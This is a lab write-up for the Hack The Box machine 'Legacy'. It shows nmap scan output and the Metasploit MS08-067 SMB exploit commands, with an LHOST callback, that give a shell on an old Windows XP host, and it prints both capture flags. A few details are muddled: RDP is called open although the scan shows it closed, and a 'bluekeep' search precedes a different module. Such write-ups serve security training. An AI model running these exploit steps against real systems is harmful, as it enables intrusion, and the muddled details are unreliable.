### IP
`10.10.10.4`

# Recon

### nmap
`nmap -sC -sV 10.10.10.4 -o Legacy.nmap`

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-18 21:29 EST
Nmap scan report for 10.10.10.4
Host is up (0.048s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: -3h56m34s, deviation: 1h24m51s, median: -4h56m35s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:77:8e (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-11-19T01:33:18+02:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.51 seconds

```
* looks like we have smb on ports 139 & 445 with a workgroup called `HTB\x00`
* also looks like rdp on port 3389

# Exploitation

### rdp
* I tried out some exploits here that were on searchsploit, but it looked like rdp maybe wasn't actually up and running on the machine?
* One of the exploits I tried out is in this writeup directory if you'd like to try for yourself

### smb

* We can look for exploits in metasploit.
	* `search rdp` shows us an interesting exploit called "bluekeep"
* Let's set up the exploit:
* Note: `10.10.14.19` should be replaced with your own ip
```
use exploit/windows/smb/ms08_067_netapi
set RHOST 10.10.10.4
set LHOST 10.10.14.19
run
```
* This gives us a session with access to the command prompt 

* Looking around the directories a bit, I see `C:\Documents and Settings\john\Desktop`, which has a `user.txt` file in it
* I must have spent like 10 minutes trying the `type` and `more` and other commands to cat out the file. After writing `help`, it turns out `cat is an available command.
* `cat user.txt` give us the user flag: `e69af0e4f443de7e36876fda4ec7644f`

* If we go to `C:\Documents and Settings\Administrator\Desktop`, we get the root flag as well: `993442d258b0e0ec917cae9e695d5713`

